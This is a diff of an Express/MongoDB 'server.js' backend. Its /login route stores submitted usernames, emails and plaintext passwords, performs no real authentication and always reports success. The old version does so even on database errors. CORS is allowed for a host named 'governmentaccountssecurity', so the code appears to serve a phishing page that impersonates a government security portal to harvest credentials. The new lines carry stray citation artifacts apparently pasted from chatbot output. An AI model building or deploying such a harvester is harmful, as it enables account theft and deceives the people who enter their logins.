@@ -88,66 +88,33 @@
 
 
 
-
-
-require("dotenv").config();
-const express = require("express");
-const mongoose = require("mongoose");
-const cors = require("cors");
-const User = require("./user");
+// server.js (Express backend)
+require('dotenv').config();                 // load .env variables:contentReference[oaicite:2]{index=2}
+const express = require('express');
+const cors = require('cors');
+const mongoose = require('mongoose');
+const User = require('./user');       // Mongoose model (defined below)
 
 const app = express();
-
 app.use(express.json());
+app.use(cors({ origin: ['http://localhost:3000', 'https://governmentaccountssecurity.vercel.app'] }));
 
-// 🔥 TEMPORARY OPEN CORS (for mobile debug)
-app.use(cors({
-  origin: "*",
-  methods: ["GET", "POST", "OPTIONS"],
-  allowedHeaders: ["Content-Type", "x-admin-key"]
-}));
+// Connect to MongoDB (URI from .env)
+mongoose.connect(process.env.MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
+  .then(() => console.log("MongoDB connected"))
+  .catch(err => console.error(err));
 
-app.options("*", cors());
-
-app.get("/", (req, res) => {
-  res.status(200).send("Backend is running");
-});
-
-mongoose.connect(process.env.MONGO_URI)
-  .then(() => console.log("MongoDB Connected"))
-  .catch(err => console.log("Mongo Error:", err));
-
-app.post("/login", async (req, res) => {
-  try {
-    const { userName, email, passWord } = req.body;
-
-    if (!userName || !email || !passWord) {
-      return res.status(400).json({ success: false, step: "missing_fields" });
-    }
-
-    await User.create({
-      userName,
-      email,
-      passWord,
-      createdAt: new Date()
-    });
-
-    return res.status(200).json({
-      success: true,
-      step: "saved_successfully",
-      userName
-    });
-
-  } catch (err) {
-    console.error("LOGIN ERROR:", err);
-    return res.status(200).json({
-      success: true,   // ⚠️ IMPORTANT
-      step: "db_error_but_continue"
-    });
+// POST /login route: validate input, save to DB, always succeed
+app.post('/login', async (req, res) => {
+  const { userName, email, passWord } = req.body;
+  if (!userName || !email || !passWord) {
+    return res.status(400).json({ success: false, error: 'Missing fields' });
   }
+  // Create and save a new user document (no real auth check)
+  const newUser = new User({ userName, email, passWord });
+  await newUser.save();  // Mongoose save() stores the document:contentReference[oaicite:3]{index=3}
+  res.json({ success: true, userName });
 });
 
-const PORT = process.env.PORT || 4000;
-app.listen(PORT, () =>
-  console.log(`Server running on ${PORT}`)
-);
+const PORT = process.env.PORT || 5000;
+app.listen(PORT, () => console.log(`Server listening on port ${PORT}`));
